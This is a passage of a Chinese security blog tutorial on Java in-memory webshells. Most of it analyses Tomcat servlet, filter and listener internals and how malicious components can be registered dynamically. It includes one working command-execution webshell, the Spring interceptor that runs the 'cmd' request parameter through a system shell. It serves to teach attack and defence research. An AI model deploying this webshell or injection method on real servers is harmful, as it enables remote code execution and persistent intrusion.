{"meta":{"title":"W01fh4cker's blog","subtitle":"","description":"Doubt is the key to knowledge.","author":"W01fh4cker","url":"https://w01fh4cker.github.io","root":"/"},"pages":[],"posts":[{"title":"完全零基础从0到1掌握Java内存马","slug":"LearnJavaMemshellFromZero","date":"2024-12-30T06:04:53.000Z","updated":"2024-12-30T06:12:51.923Z","comments":true,"path":"2024/12/30/LearnJavaMemshellFromZero/","permalink":"https://w01fh4cker.github.io/2024/12/30/LearnJavaMemshellFromZero/","excerpt":"","text":"本文目录： 一、前言 二、前置知识 2.1 Servlet容器与Engine、Host、Context和Wrapper 2.2 编写一个简单的servlet 2.3 从代码层面看servlet初始化与装载流程 2.3.1 servlet初始化流程分析 2.3.2 servlet装载流程分析 2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain 2.5 编写一个简单的Filter 2.6 从代码层面分析Filter运行的整体流程 2.7 Listener简单介绍 2.8 编写一个简单的Listener（ServletRequestListener） 2.9 从代码层面分析Listener运行的整体流程 2.10 简单的spring项目搭建 2.10.1 编写一个简单的Spring Controller 2.10.2 编写一个简单的Spring Interceptor 2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty） 2.11 Spring MVC介绍 2.11.1 Spring MVC九大组件 2.11.2 简单的源码分析 2.11.2.1 九大组件的初始化 2.11.2.2 url和Controller的关系的建立 2.11.2.3 Spring Interceptor引入与执行流程分析 2.12 Spring WebFlux介绍与代码调试分析 2.12.1 什么是Mono？ 2.12.2 什么是Flux？ 2.12.3 Spring WebFlux启动过程分析 2.12.4 Spring WebFlux请求处理过程分析 2.12.5 Spring WebFlux过滤器WebFilter运行过程分析 2.13 Tomcat Valve介绍与运行过程分析 2.13.1 Valve与Pipeline 2.13.2 编写一个简单Tomcat Valve的demo 2.13.3 Tomcat Valve打入内存马思路分析 2.14 Tomcat Upgrade介绍与打入内存马思路分析 2.14.1 编写一个简单的Tomcat Upgrade的demo 2.14.1.1 利用SpringBoot搭建 2.14.1.2 利用Tomcat搭建 2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析 2.15 Tomcat Executor内存马介绍与打入内存马思路分析 2.15.1 2.15.2 Tomcat Executor内存马介绍与代码调试分析 2.15.2.1 Endpoint五大组件 2.15.2.2 Endpoint分类 2.15.2.3 Executor相关代码分析 三、传统Web型内存马 3.1 Servlet内存马 3.1.1 简单的servlet内存马demo编写 3.1.2 servlet内存马demo代码分析 3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解 3.2 Filter内存马 3.2.1 简单的filter内存马demo编写 3.2.2 servlet内存马demo代码分析 3.2.3 tomcat6下filter内存马的编写 3.3 Listener内存马 3.3.1 简单的Listener内存马demo编写 3.3.2 Listener内存马demo代码分析 四、Spring MVC框架型内存马 4.1 Spring Controller型内存马 4.1.1 简单的Spring Controller型内存马demo编写 4.1.2 Spring Controller型内存马demo代码分析 4.2 Spring Interceptor型内存马 4.3 Spring WebFlux内存马 4.3.1 简单的Spring WebFlux内存马demo编写 4.3.2 Spring WebFlux内存马demo代码分析 五、中间件型内存马 5.1 Tomcat Valve型内存马 5.2 Tomcat Upgrade内存马 5.3 Tomcat Executor内存马 六、致谢 一、前言&ensp;&ensp;&ensp;&ensp;之前写的零基础学Fastjson的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。&ensp;&ensp;&ensp;&ensp;本文所讨论的Java内存马是Java安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了su18师傅一年多以前发表在Goby社区的这篇文章（https://nosec.org/home/detail/5049.html）中给出的分类方式，把整个零基础掌握java内存马系列分成了以下几个部分：传统web型、spring系列框架型、中间件型、其他内存马（Websocket/Jsp/线程型/RMI）、Agent型内存马、实战内存马打入（Jetty&#x2F;Weblogic&#x2F;Shiro&#x2F;Struts2&#x2F;GlassFish&#x2F;xxl-job…）和内存马。&ensp;&ensp;&ensp;&ensp;好了，让我们闲话少叙，就此开始。 二、前置知识本篇文章除特殊说明外，使用的是jdk1.8.0_202+ tomcat 9.0.85，后者下载地址为： https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。 2.1 Servlet容器与Engine、Host、Context和Wrapper这部分我找了好久，终于在一大堆高深&#x2F;垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。 原文地址：https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li 这里组合引用其原文，简单概括，就是： Tomcat设计了四种容器，分别是Engine、Host、Context和Wrapper，其关系如下： 这一点可以从Tomcat的配置文件server.xml中看出来。 此时，设想这样一个场景：我们此时要访问https://manage.xxx.com:8080/user/list，那tomcat是如何实现请求定位到具体的servlet的呢？为此tomcat设计了Mapper，其中保存了容器组件与访问路径的映射关系。 然后就开始四步走： 根据协议和端口号选定Service和Engine。 我们知道Tomcat的每个连接器都监听不同的端口，比如Tomcat默认的HTTP连接器监听8080端口、默认的AJP连接器监听8009端口。上面例子中的URL访问的是8080端口，因此这个请求会被HTTP连接器接收，而一个连接器是属于一个Service组件的，这样Service组件就确定了。我们还知道一个Service组件里除了有多个连接器，还有一个容器组件，具体来说就是一个Engine容器，因此Service确定了也就意味着Engine也确定了。 根据域名选定Host。 Service和Engine确定后，Mapper组件通过url中的域名去查找相应的Host容器，比如例子中的url访问的域名是manage.xxx.com，因此Mapper会找到Host1这个容器。 根据url路径找到Context组件。 Host确定以后，Mapper根据url的路径来匹配相应的Web应用的路径，比如例子中访问的是/user，因此找到了Context1这个Context容器。 根据url路径找到Wrapper（Servlet）。 Context确定后，Mapper再根据web.xml中配置的Servlet映射路径来找到具体的Wrapper和Servlet，例如这里的Wrapper1的/list。 这里的Context翻译过来就是上下文，它包括servlet运行的基本环境；这里的Wrapper翻译过来就是包装器，它负责管理一个servlet，包括其装载、初始化、执行和资源回收。 关于上图中的连接器的设计，可以继续参考该作者的博文： https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de 写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于tomcat架构的原理解析： https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09 2.2 编写一个简单的servletpom.xml文件如下： 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;servletMemoryShell&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 同步下依赖： TestServlet.java代码如下： 1234567891011121314package org.example;import java.io.IOException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@WebServlet(&quot;/test&quot;)public class TestServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123; resp.getWriter().write(&quot;hello world&quot;); &#125;&#125; 然后配置项目运行所需的tomcat环境： 然后配置artifacts，直接点击fix： 然后添加web模块： 运行之后，访问http://localhost:8080/testServlet/test： 2.3 从代码层面看servlet初始化与装载流程主要参考文章： https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/ 我们这里不采用我们下载的tomcat来运行我们的项目，我们使用嵌入式tomcat也就是所谓的tomcat-embed-core。关于动态调试，我是图省事，直接用tomcat-embed-core，你当然也可以调试直接调试tomcat源码，环境搭建方法可以参考Skay师傅的文章： https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw 我们重开一个项目，文件代码如下： pom.xml： 1234567891011121314151617181920212223242526272829303132&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;servletMemoryShell&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; Main.java： 123456789101112131415161718package org.example;import org.apache.catalina.Context;import org.apache.catalina.LifecycleException;import org.apache.catalina.startup.Tomcat;import java.io.File;public class Main &#123; public static void main(String[] args) throws LifecycleException &#123; Tomcat tomcat = new Tomcat(); tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603 Context context = tomcat.addWebapp(&quot;&quot;, new File(&quot;.&quot;).getAbsolutePath()); Tomcat.addServlet(context, &quot;helloServlet&quot;, new HelloServlet()); context.addServletMappingDecoded(&quot;/hello&quot;, &quot;helloServlet&quot;); tomcat.start(); tomcat.getServer().await(); &#125;&#125; HelloServlet.java： 1234567891011121314151617181920package org.example;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;@WebServlet(&quot;/hello&quot;)public class HelloServlet extends HttpServlet &#123; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text/html&quot;); PrintWriter out = response.getWriter(); out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;); out.println(&quot;Hello, World!&quot;); out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;); &#125;&#125; 2.3.1 servlet初始化流程分析我们在org.apache.catalina.core.StandardWrapper#setServletClass处下断点调试： 我们尝试按Ctrl+左键追踪它的上层调用位置，但是提示我们找不到，需要按两次Ctrl+Alt+F7： 然后就可以看到，上层调用位置位于org.apache.catalina.startup.ContextConfig#configureContext： 接下来我们详细看下面这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253for (ServletDef servlet : webxml.getServlets().values()) &#123; Wrapper wrapper = context.createWrapper(); if (servlet.getLoadOnStartup() != null) &#123; wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); &#125; if (servlet.getEnabled() != null) &#123; wrapper.setEnabled(servlet.getEnabled().booleanValue()); &#125; wrapper.setName(servlet.getServletName()); Map&lt;String,String&gt; params = servlet.getParameterMap(); for (Entry&lt;String, String&gt; entry : params.entrySet()) &#123; wrapper.addInitParameter(entry.getKey(), entry.getValue()); &#125; wrapper.setRunAs(servlet.getRunAs()); Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs(); for (SecurityRoleRef roleRef : roleRefs) &#123; wrapper.addSecurityReference( roleRef.getName(), roleRef.getLink()); &#125; wrapper.setServletClass(servlet.getServletClass()); MultipartDef multipartdef = servlet.getMultipartDef(); if (multipartdef != null) &#123; long maxFileSize = -1; long maxRequestSize = -1; int fileSizeThreshold = 0; if(null != multipartdef.getMaxFileSize()) &#123; maxFileSize = Long.parseLong(multipartdef.getMaxFileSize()); &#125; if(null != multipartdef.getMaxRequestSize()) &#123; maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize()); &#125; if(null != multipartdef.getFileSizeThreshold()) &#123; fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold()); &#125; wrapper.setMultipartConfigElement(new MultipartConfigElement( multipartdef.getLocation(), maxFileSize, maxRequestSize, fileSizeThreshold)); &#125; if (servlet.getAsyncSupported() != null) &#123; wrapper.setAsyncSupported( servlet.getAsyncSupported().booleanValue()); &#125; wrapper.setOverridable(servlet.isOverridable()); context.addChild(wrapper); &#125; for (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123; context.addServletMappingDecoded(entry.getKey(), entry.getValue()); &#125; 首先通过webxml.getServlets()获取的所有Servlet定义，并建立循环；然后创建一个Wrapper对象，并设置Servlet的加载顺序、是否启用（即获取&lt;/load-on-startup&gt;标签的值）、Servlet的名称等基本属性；接着遍历Servlet的初始化参数并设置到Wrapper中，并处理安全角色引用、将角色和对应链接添加到Wrapper中；如果Servlet定义中包含文件上传配置，则根据配置信息设置MultipartConfigElement；设置Servlet是否支持异步操作；通过context.addChild(wrapper);将配置好的Wrapper添加到Context中，完成Servlet的初始化过程。 上面大的for循环中嵌套的最后一个for循环则负责处理Servlet的url映射，将Servlet的url与Servlet名称关联起来。 也就是说，Servlet的初始化主要经历以下六个步骤： 创建Wapper对象； 设置Servlet的LoadOnStartUp的值； 设置Servlet的名称； 设置Servlet的class； 将配置好的Wrapper添加到Context中； 将url和servlet类做映射 2.3.2 servlet装载流程分析我们在org.apache.catalina.core.StandardWrapper#loadServlet这里打下断点进行调试，重点关注org.apache.catalina.core.StandardContext#startInternal： 可以看到，装载顺序为Listener–&gt;Filter–&gt;Servlet： 可以看到，上面红框中的代码都调用了org.apache.catalina.core.StandardContext#loadOnStartup，Ctrl+左键跟进该方法，代码如下： 123456789101112131415161718192021222324252627public boolean loadOnStartup(Container children[]) &#123; TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;(); for (Container child : children) &#123; Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup(); if (loadOnStartup &lt; 0) &#123; continue; &#125; Integer key = Integer.valueOf(loadOnStartup); map.computeIfAbsent(key, k -&gt; new ArrayList&lt;&gt;()).add(wrapper); &#125; for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123; for (Wrapper wrapper : list) &#123; try &#123; wrapper.load(); &#125; catch (ServletException e) &#123; getLogger().error( sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;, getName(), wrapper.getName()), StandardWrapper.getRootCause(e)); if (getComputedFailCtxIfServletStartFails()) &#123; return false; &#125; &#125; &#125; &#125; return true;&#125; 可以看到，这段代码先是创建一个TreeMap，然后遍历传入的Container数组，将每个Servlet的loadOnStartup值作为键，将对应的Wrapper对象存储在相应的列表中；如果这个loadOnStartup值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个loadOnStartup的升序的顺序来加载。 2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain开头先明确一点，就是Filter容器是用于对请求和响应进行过滤和处理的，以下这张图是根据Skay师傅文章中的图片重制的： https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g 从上图可以看出，这个filter就是一个关卡，客户端的请求在经过filter之后才会到Servlet，那么如果我们动态创建一个filter并且将其放在最前面，我们的filter就会最先执行，当我们在filter中添加恶意代码，就可以实现命令执行，形成内存马。 这些名词其实很容易理解，首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等，这一点可以从org/apache/tomcat/util/descriptor/web/FilterDef.java的代码中看出来；然后是FilterDefs，它只是过滤器的抽象定义，而FilterConfigs则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是FilterMaps，它是用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs，从而确定要执行的过滤器链；而FilterChain是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。 2.5 编写一个简单的Filter我们继续用我们之前在2.2中搭建的环境，添加TestFilter.java： 12345678910111213141516171819202122package org.example;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import java.io.IOException;@WebFilter(&quot;/test&quot;)public class TestFilter implements Filter &#123; public void init(FilterConfig filterConfig) &#123; System.out.println(&quot;[*] Filter初始化创建&quot;); &#125; public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; System.out.println(&quot;[*] Filter执行过滤操作&quot;); filterChain.doFilter(servletRequest, servletResponse); &#125; public void destroy() &#123; System.out.println(&quot;[*] Filter已销毁&quot;); &#125;&#125; 跑起来之后，控制台输出[*] Filter初始化创建，当我们访问/test路由的时候，控制台继续输出[*] Filter执行过滤操作，当我们结束tomcat的时候，会触发destroy方法，从而输出[*] Filter已销毁： 2.6 从代码层面分析Filter运行的整体流程我们在上面的demo中的doFilter函数这里下断点进行调试： 跟进org.apache.catalina.core.StandardWrapperValve#invoke： 1filterChain.doFilter(request.getRequest(), response.getResponse()); 继续跟进变量filterChain，找到定义处的代码： 1ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); 查看该方法（org.apache.catalina.core.ApplicationFilterFactory#createFilterChain）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) &#123; if (servlet == null) &#123; return null; &#125; else &#123; ApplicationFilterChain filterChain = null; if (request instanceof Request) &#123; Request req = (Request)request; if (Globals.IS_SECURITY_ENABLED) &#123; filterChain = new ApplicationFilterChain(); &#125; else &#123; filterChain = (ApplicationFilterChain)req.getFilterChain(); if (filterChain == null) &#123; filterChain = new ApplicationFilterChain(); req.setFilterChain(filterChain); &#125; &#125; &#125; else &#123; filterChain = new ApplicationFilterChain(); &#125; filterChain.setServlet(servlet); filterChain.setServletSupportsAsync(wrapper.isAsyncSupported()); StandardContext context = (StandardContext)wrapper.getParent(); FilterMap[] filterMaps = context.findFilterMaps(); if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123; DispatcherType dispatcher = (DispatcherType)request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;); String requestPath = null; Object attribute = request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;); if (attribute != null) &#123; requestPath = attribute.toString(); &#125; String servletName = wrapper.getName(); FilterMap[] var10 = filterMaps; int var11 = filterMaps.length; int var12; FilterMap filterMap; ApplicationFilterConfig filterConfig; for(var12 = 0; var12 &lt; var11; ++var12) &#123; filterMap = var10[var12]; if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123; filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName()); if (filterConfig != null) &#123; filterChain.addFilter(filterConfig); &#125; &#125; &#125; var10 = filterMaps; var11 = filterMaps.length; for(var12 = 0; var12 &lt; var11; ++var12) &#123; filterMap = var10[var12]; if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123; filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName()); if (filterConfig != null) &#123; filterChain.addFilter(filterConfig); &#125; &#125; &#125; return filterChain; &#125; else &#123; return filterChain; &#125; &#125;&#125; 我们在该方法和下面定义filterMaps那行下断点进行调试，可以看到，这段代码先是判断servlet是否为空，如果是就表示没有有效的servlet，无法创建过滤器链；然后根据传入的ServletRequest的类型来分类处理，如果是Request类型，并且启用了安全性，那么就创建一个新的ApplicationFilterChain，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的Servlet和异步支持属性，这个没啥说的；关键点在于后面从Wrapper中获取父级上下文（StandardContext），然后获取该上下文中定义的过滤器映射数组（FilterMap）；最后遍历过滤器映射数组，根据请求的DispatcherType和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。 从上面的两张图我们也可以清晰地看到filterConfig、filterMap、FilterDef的结构。 跟进刚才的filterChain.doFilter方法，位于org.apache.catalina.core.ApplicationFilterChain#doFilter： 可以看到都是调用了org.apache.catalina.core.ApplicationFilterChain#internalDoFilter方法，在这个方法中会依次拿到filterConfig和filter： 好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个Filter，回顾之前的调试过程，我们发现在createFilterChain那个函数里面有两个关键点： 也就是这里我用箭头指出来的org.apache.catalina.core.StandardContext#findFilterMaps和org.apache.catalina.core.StandardContext#findFilterConfig。 二者的实现代码粘贴如下： 123456789public FilterMap[] findFilterMaps() &#123; return filterMaps.asArray();&#125;public FilterConfig findFilterConfig(String name) &#123; synchronized (filterDefs) &#123; return filterConfigs.get(name); &#125;&#125; 也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。 那也就是说，我们现在的问题就转化为如何添加filterMap和filterConfig。我们搜索关键词addFilterMap，即可看到在StandardContext中有两个相关的方法： 注释里面也说的很清楚，addFilterMap是在一组映射末尾添加新的我们自定义的新映射；而addFilterMapBefore则会自动把我们创建的filterMap丢到第一位去，无需再手动排序，这正是我们需要的呀！ 可以看到，上面的addFilterMapBefore函数中第一步是先执行org.apache.catalina.core.StandardContext#validateFilterMap这个函数，点击去看看： 发现我们需要保证它在根据filterName找filterDef的时候，得能找到，也就是说，我们还得自定义filterDef并把它加入到filterDefs，不过这个也很简单，也有对应的方法，也就是org.apache.catalina.core.StandardContext#addFilterDef： 搞定，继续去看filterConfig如何添加。经过搜索发现，不存在类似上面的addFilterConfig这种方法： 但是有filterStart和filterStop这两个方法： 那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。 2.7 Listener简单介绍 由上图可知，Listener是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的Listener，就又可以形成一种内存马了。 在tomcat中，常见的Listener有以下几种： ServletContextListener，用来监听整个Web应用程序的启动和关闭事件，需要实现contextInitialized和contextDestroyed这两个方法； ServletRequestListener，用来监听HTTP请求的创建和销毁事件，需要实现requestInitialized和requestDestroyed这两个方法； HttpSessionListener，用来监听HTTP会话的创建和销毁事件，需要实现sessionCreated和sessionDestroyed这两个方法； HttpSessionAttributeListener，监听HTTP会话属性的添加、删除和替换事件，需要实现attributeAdded、attributeRemoved和attributeReplaced这三个方法。 很明显，ServletRequestListener是最适合做内存马的，因为它只要访问服务就能触发操作。 2.8 编写一个简单的Listener（ServletRequestListener）我们继续用我们之前在2.2中搭建的环境，替换掉之前的TestFilter.java，重新写一个TestListener.java： 1234567891011121314151617package org.example;import javax.servlet.*;import javax.servlet.annotation.WebListener;@WebListener(&quot;/test&quot;)public class TestListener implements ServletRequestListener &#123; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; System.out.println(&quot;[+] destroy TestListener&quot;); &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123; System.out.println(&quot;[+] initial TestListener&quot;); &#125;&#125; 运行结果： 2.9 从代码层面分析Listener运行的整体流程我们在如图所示的两个地方下断点调试： 往下翻可以看到org.apache.catalina.core.StandardContext#listenerStart方法的调用： 代码写的通俗易懂，主要有两个事情要干，一是通过findApplicationListeners找到这些Listerner的名字；二是实例化这些listener： 接着就是分类摆放，我们需要的ServletRequestListener被放在了eventListeners里面： 分类摆放完了之后，干这样一件事情： 1eventListeners.addAll(Arrays.asList(getApplicationEventListeners())); Arrays.asList(...) 好理解，意思就是将数组转换为列表；eventListeners.addAll(...)也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 eventListeners 中。关于括号里边的org.apache.catalina.core.StandardContext#getApplicationEventListeners这个方法，我们点进去看，代码如下： 1234@Overridepublic Object[] getApplicationEventListeners() &#123; return applicationEventListenersList.toArray();&#125; 也很简单明了，就是把applicationEventListenersList转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。 那这总结起来就一句话，就是Listener有两个来源，一是根据web.xml文件或者@WebListener注解实例化得到的Listener；二是applicationEventListenersList中的Listener。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的addFilterConfig这种函数呢？当然是有的，ctrl+左键往上找： 方法名字叫做addApplicationEventListener，在StandardContext.java里面，代码如下，完美符合我们的需求，真是太哇塞了： 123public void addApplicationEventListener(Object listener) &#123; applicationEventListenersList.add(listener);&#125; 2.10 简单的spring项目搭建新建个项目，设置Server URL为https://start.aliyun.com/： 等待依赖解析完成： 这里给我们准备了一个示例，我们可以直接跑起来： 2.10.1 编写一个简单的Spring Controller1234567891011121314package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class TestController &#123; @ResponseBody @RequestMapping(&quot;/&quot;) public String test()&#123; return &quot;hello world&quot;; &#125;&#125; 非常地简单： 2.10.2 编写一个简单的Spring InterceptorTestInterceptor.java： 1234567891011121314151617181920212223242526272829303132package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class TestInterceptor extends HandlerInterceptorAdapter &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String cmd = request.getParameter(&quot;cmd&quot;); if(cmd != null)&#123; try &#123; java.io.PrintWriter writer = response.getWriter(); String output = &quot;&quot;; ProcessBuilder processBuilder; if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123; processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;, &quot;/c&quot;, cmd); &#125;else&#123; processBuilder = new ProcessBuilder(&quot;/bin/sh&quot;, &quot;-c&quot;, cmd); &#125; java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;); output = inputScanner.hasNext() ? inputScanner.next(): output; inputScanner.close(); writer.write(output); writer.flush(); writer.close(); &#125; catch (Exception ignored)&#123;&#125; return false; &#125; return true; &#125;&#125; WebConfig.java： 1234567891011121314package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebConfig implements WebMvcConfigurer &#123; @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(new TestInterceptor()).addPathPatterns(&quot;/**&quot;); &#125;&#125; Controller就是之前写的TestController.java，运行后访问http://127.0.0.1:8080/?cmd=whoami： 2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）我们先聊聊怎么自己写一个Spring WebFlux框架的demo。 这里我们新建一个SpringBoot项目，取名WebFluxMemoryShellDemo： 这里选择Spring Reactive Web： 接着新建两个文件，这里为了方便，我把这两个文件放到hello文件夹下。 GreetingHandler.java： 123456789101112131415package org.example.webfluxmemoryshelldemo.hello;import org.springframework.http.MediaType;import org.springframework.stereotype.Component;import org.springframework.web.reactive.function.BodyInserters;import org.springframework.web.reactive.function.server.ServerRequest;import org.springframework.web.reactive.function.server.ServerResponse;import reactor.core.publisher.Mono;@Componentpublic class GreetingHandler &#123; public Mono&lt;ServerResponse&gt; hello(ServerRequest request) &#123; return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue(&quot;Hello, Spring!&quot;)); &#125;&#125; GreetingRouter.java： 1234567891011121314package org.example.webfluxmemoryshelldemo.hello;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.http.MediaType;import org.springframework.web.reactive.function.server.*;@Configurationpublic class GreetingRouter &#123; @Bean public RouterFunction&lt;ServerResponse&gt; route(GreetingHandler greetingHandler) &#123; return RouterFunctions.route(RequestPredicates.GET(&quot;/hello&quot;).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello); &#125;&#125; 